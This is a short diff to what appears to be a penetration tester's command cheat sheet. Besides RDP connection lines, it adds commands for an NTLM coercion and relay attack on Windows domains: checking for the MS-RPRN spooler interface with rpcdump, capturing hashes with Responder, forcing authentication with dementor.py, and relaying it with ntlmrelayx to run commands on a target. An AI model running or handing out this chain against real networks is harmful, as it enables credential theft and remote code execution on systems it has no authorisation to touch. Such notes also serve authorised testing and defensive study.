@@ -19,3 +19,9 @@ xfreerdp +clipboard /size:1920x1060 /u:Administrator /p:xxx /v:ip_localhost:1338
 
 rdesktop ip_localhost:13389 -u aita -p kilo
 
+
+
+rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
+./Responder.py -I eth0 --lm
+python3 dementor.py -d domain -u username -p password RESPONDERIP TARGET (chaneg "import ConfigParser" to "import configparser")
+python3 ntlmrelayx.py -smb2support -t smb://target_ip -c 'whoami /all' -debug
